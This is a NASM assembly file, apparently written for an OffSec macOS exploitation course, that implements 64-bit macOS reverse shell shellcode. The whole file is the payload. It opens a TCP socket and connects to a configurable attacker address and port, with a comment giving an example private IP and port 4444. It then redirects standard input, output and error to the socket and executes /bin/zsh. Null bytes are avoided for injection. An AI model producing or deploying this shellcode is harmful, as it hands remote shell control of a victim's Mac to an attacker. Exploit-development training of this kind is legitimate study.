; macOS_reverse_shell_x64.nasm 
; Author: Jack McBride (OS-40652)
; Website: https://jacklgmcbride.co.uk
; 
; Purpose: OSMR macOS 64-bit reverse shell shellcode 
;

bits 64

global _main

_main:
; socket
push    0x2
pop     rdi                     ; RDI = AF_INET = 2
push    0x1
pop     rsi                     ; RSI = SOCK_STREAM = 1
xor     rdx, rdx                ; RDX = IPPROTO_IP = 0

; store syscall number in RAX
push    0x61                    ; put 97 on the stack (socket syscall#)
pop     rax                     ; pop 97 to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall                         ; trigger syscall
mov     r9, rax                 ; save socket number

; connect
mov     rdi, r9                 ; put saved socket fd value to RDI = socket fd

; Begin building the memory structure on the stack
xor     rsi, rsi                ; RSI = sin_zero[8] = 0x0000000000000000
push    rsi                     ;

; next entry on the stack should be 0x9f31a8c0 5c11 02 00 = (sin_addr .. sin_len)
mov     rsi, 0xADDRESSPORT0201 ; port sin_addr=0x9f31a8c0 sin_port=0x115c, sin_family=0x02, sin_len=0x00
dec     rsi                     ; decrement ESI by 1 to resolve to correct value and avoid NULLs
push    rsi                     ; push RSI (=0x9f31a8c05c110200) to the stack
push    rsp
pop     rsi                     ; RSI = RSP = pointer to the structure

push    0x10
pop     rdx                     ; RDX = 0x10 (length of the socket structure - 16 bytes)

; store syscall number on RAX
push    0x62                    ; put 98 on the stack (connect syscall #)
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall                         ; trigger syscall

; dup2
xor     rsi, rsi                ; set RSI = 0
push    0x5a                    ; put 90 on the stack (dup2 syscall #)
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
mov     r9, rax
syscall
inc     rsi                     ; increment RSI = 1
mov     rax, r9
syscall
inc rsi                         ; increment RSI = 2
mov     rax, r9
syscall

; execve
xor     rdx, rdx                ; zero our RDX
push    rdx                     ; push NULL string terminator
mov     rbx, '/bin/zsh'         ; move our string into RBX
push    rbx                     ; push the string we stored in RBX to the stack
mov     rdi, rsp                ; store the stack pointer in RDI
push    rdx                     ; argv[1] = 0
push    rdi                     ; argv[0] = /bin/zsh
mov     rsi, rsp                ; argv    = rsp - store RSP's value in RSI
push    59                      ; put 59 on the stack
pop     rax                     ; pop it to RAX
bts     rax, 25                 ; set the 25th bit to 1
syscall
